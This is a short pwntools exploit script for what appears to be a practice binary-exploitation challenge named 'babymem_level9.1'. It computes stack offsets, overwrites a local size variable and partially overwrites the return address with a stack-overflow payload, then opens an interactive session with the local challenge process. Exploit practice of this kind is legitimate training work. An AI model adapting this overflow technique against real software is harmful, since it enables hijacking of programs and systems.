from pwn import *

# Init
elf = ELF("/challenge/babymem_level9.1")

buffer_length = int("58", 16) #local_58
distance_variable_n = int("14", 16) #local_18 + 4
distance_between_buffer_and_n = buffer_length - distance_variable_n

print(buffer_length)
print(distance_variable_n)
print(distance_between_buffer_and_n)

io = elf.process()

# Payload
payload = b"A"*(distance_between_buffer_and_n) + p64(0x50) + b"\x87\x19"

# Interaction
io.recvuntil("size:")
io.sendline(str(buffer_length + 2))

io.recvuntil("bytes)!")
io.sendline(payload)

io.interactive()